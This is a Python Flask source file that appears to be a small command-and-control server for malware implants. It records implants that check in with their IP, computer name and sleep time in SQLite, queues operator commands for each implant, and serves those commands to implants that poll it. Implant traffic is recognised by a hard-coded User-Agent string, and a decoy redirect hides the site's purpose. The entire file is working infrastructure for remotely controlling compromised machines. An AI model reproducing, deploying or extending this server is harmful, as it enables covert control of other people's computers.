from flask import Flask, render_template, request, url_for, redirect, jsonify
import sqlite3
from flask.cli import AppGroup
from datetime import datetime
import os, cv2, string
import requests
import random
import string
import json


if os.path.exists('./data/real.db'):
    pass
else:
    os.mknod("./database/real.db")

app = Flask(__name__)

dbpath = "sqlite:///data/real.db"
# real.db < create.sql

# connection = sqlite3.connect("./data/real.db")
# cursor = connection.cursor()


def makeId(length=10):
    return (''.join(random.choice(string.ascii_lowercase) for i in range(length))).upper()


def addImplant(data):
    connection = sqlite3.connect("./data/real.db")
    cursor = connection.cursor()
    results = [x for x in cursor.execute(
        "SELECT id FROM Implants WHERE agentId=?", [(data["agentId"])])]
    if len(results) == 0:
        parsedData = ["PleaseGiveA", makeId(), str(
            datetime.today()), data["IP"], data["sleepTime"], data["guido"], data["computerName"], data["cmdQ"]]

        cursor.execute('INSERT INTO Implants (authorize_code, agentId, checkTime, IP, sleepTime, guido, computerName, cmdQ)\
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)', parsedData)
        connection.commit()

    elif (len(results) == 1):
        return ("I lowkey don't know what we change everytime we checkIn after the first time, so this text is a placeholder")

        # parsedData = [data["authorize_code"], makeId(), str(
        #     datetime.today()), data["IP"], data["sleepTime"], data["guido"], data["computerName"], data["DHkey"]]

        # cursor.execute('INSERT INTO Implants (authorize_code, agentId, checkTime, IP, sleepTime, guido, computerName, DHkey)\
        #                 VALUES (?, ?, 34, ?, ?, ?, ?, ?)', parsedData)
        # connection.commit()
    else:
        return("Error, Implant already recorded at indexes:", results)

    connection.close()
    return ("Successfully added to database")


@ app.route("/sqlcheck")
def seeTable():
    print(request.headers["User-Agent"])
    if (request.headers["User-Agent"]) == "IWasBornInTheUSA":
        connection = sqlite3.connect("./data/real.db")
        cursor = connection.cursor()
        ans = []
        for row in cursor.execute("select * from Implants"):
            ans.append(row)
        connection.close()
        return jsonify(data=ans)
    else:
        return render_template("wrongTurn.html")


@ app.route("/")
def index():
    return redirect("https://www.youtube.com/watch?v=Pv0CA1rjGfg")

@ app.route("/checkIn", methods=['POST'])
def check():
    print(request.headers["User-Agent"])
    if (request.headers["User-Agent"]) == "IWasBornInTheUSA":
        # raw data function d = request.get_data()
        #print("test")
        #print("first:", request.data, type(request.data))
        
        data = request.data.decode("utf-8")
        #print("before", type(data))
        
        #print(type(json.loads(data)))
        
        # loaded=json.loads(data)
        # data=json.dumps(loaded, indent=4, sort_keys=True)
        data=json.loads(data)
        #print("after", data)
        data["IP"] = request.remote_addr
        data["cmdQ"] = "No Cmds"
        print(data)
        addImplant(data)
        return data
    else:
        return render_template("wrongTurn.html")
        # return redirect("https://www.youtube.com/watch?v=Pv0CA1rjGfg")


@ app.route("/jason")
def jason():
    print(request.get_data())
    return request.get_data()

@ app.route("/remote", methods=['POST', 'GET'])
def cmds():
    data = json.loads(request.get_data())
    ip = data["IP"]
    cmds = data["cmds"]
    connection = sqlite3.connect("./data/real.db")
    cursor = connection.cursor()
    ans =[x for x in cursor.execute("SELECT cmdQ FROM Implants WHERE IP = ?", [ip])]
    if len(ans)==0:
        return ("That IP is not in the table, commands won't be executed")
    elif len(ans)==1:
        fullCmd = ans[0][0]
        for arg in cmds:
            if fullCmd == "No Cmds":
                fullCmd = arg
            else:
                fullCmd += " "+arg
        fullCmd+=";"
        cursor.execute("UPDATE Implants SET cmdQ = ? WHERE IP = ?", (fullCmd, ip))
        connection.commit()
        connection.close()
        return ("Commands have been placed in queue")
    else:
        return ("multiple same Ips found, commands won't be executed")

    

@ app.route("/jobs", methods=['POST', 'GET'])
def getJobs():
    if (request.headers["User-Agent"]) == "IWasBornInTheUSA":
        ip = request.remote_addr
        connection = sqlite3.connect("./data/real.db")
        cursor = connection.cursor()
        ans = []
        for x in cursor.execute("SELECT cmdQ FROM Implants WHERE IP = ?", [ip]):
            ans+=x
        print(ans)
        if len(ans)==0:
            return str("No Tasks")
        else:
            return str(ans)
    else:
        return render_template("wrongTurn.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0")

# gunicorn -w 5 runserver.py
